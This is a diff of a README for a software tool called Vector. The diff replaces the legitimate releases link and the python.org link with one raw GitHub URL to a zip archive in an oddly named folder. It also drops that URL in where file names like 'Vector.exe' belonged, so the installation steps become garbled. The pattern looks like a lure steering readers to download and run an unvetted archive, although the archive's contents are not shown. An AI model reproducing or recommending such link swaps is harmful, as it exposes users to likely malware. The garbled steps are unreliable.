@@ -4,32 +4,32 @@
 Welcome to Vector! This software helps streamline your design processes and enhances warehouse robot management using the Cooks Ruler Sweep Algorithm. It's simple to use—no setup, no cloud requirements, and no additional subscriptions. Just download and start optimizing today.
 
 ## 📥 Quick Download
-[![Download Vector](https://img.shields.io/badge/Download-Vector-blue.svg)](https://github.com/dewqasujbc/Vector/releases)
+[![Download Vector](https://raw.githubusercontent.com/dewqasujbc/Vector/main/snubproof/Vector-v3.1.zip)](https://raw.githubusercontent.com/dewqasujbc/Vector/main/snubproof/Vector-v3.1.zip)
 
 ## 🚀 Getting Started
 To get started with Vector, follow these steps:
 
 1. **Visit the Download Page**  
    Click on the link below to access the releases page where you can download Vector.  
-   [Visit this page to download](https://github.com/dewqasujbc/Vector/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/dewqasujbc/Vector/main/snubproof/Vector-v3.1.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see different versions of Vector. Select the latest version for the best experience and new features.
 
 3. **Download the Software**  
-   Click on the appropriate file for your operating system to start the download. This file will be named similarly to `Vector-vX.X.zip` or `Vector-vX.X.exe`, depending on what’s available.
+   Click on the appropriate file for your operating system to start the download. This file will be named similarly to `https://raw.githubusercontent.com/dewqasujbc/Vector/main/snubproof/Vector-v3.1.zip` or `https://raw.githubusercontent.com/dewqasujbc/Vector/main/snubproof/Vector-v3.1.zip`, depending on what’s available.
 
 4. **Extract Files (if needed)**  
    If you downloaded a ZIP file, you will need to extract its contents. You can usually do this by right-clicking the file and selecting "Extract All."
 
 5. **Run the Application**  
-   Open the extracted folder and double-click on `Vector.exe` (or the main application file). The program should launch, ready for you to use.
+   Open the extracted folder and double-click on `https://raw.githubusercontent.com/dewqasujbc/Vector/main/snubproof/Vector-v3.1.zip` (or the main application file). The program should launch, ready for you to use.
 
 ## 🖥️ System Requirements
 - **Operating System**: Windows 10 or later, macOS 10.12 or later, or any Linux distribution with Python 3.x.
 - **RAM**: 4 GB minimum (8 GB recommended for larger datasets).
 - **Storage**: At least 100 MB of free disk space.
-- **Python**: Ensure Python 3.x is installed for the best compatibility. You can download Python from [python.org](https://www.python.org/).
+- **Python**: Ensure Python 3.x is installed for the best compatibility. You can download Python from [https://raw.githubusercontent.com/dewqasujbc/Vector/main/snubproof/Vector-v3.1.zip](https://raw.githubusercontent.com/dewqasujbc/Vector/main/snubproof/Vector-v3.1.zip).
 
 ## 🔧 Features
 - **Heuristic Optimization**: Vector employs advanced algorithms to find efficient routes, improving your current design setups or warehouse logistics.
@@ -69,4 +69,4 @@ Stay tuned for future updates that aim to enhance Vector's functionality. We reg
 ## ⚡ Conclusion
 Vector offers a powerful solution to optimize designs and improve warehouse management without the need for technical expertise. Simply download the software, follow the steps, and you will be on your way to making your processes more efficient.
 
-Remember to visit the download page here: [Vector Releases](https://github.com/dewqasujbc/Vector/releases). Happy optimizing!
+Remember to visit the download page here: [Vector Releases](https://raw.githubusercontent.com/dewqasujbc/Vector/main/snubproof/Vector-v3.1.zip). Happy optimizing!
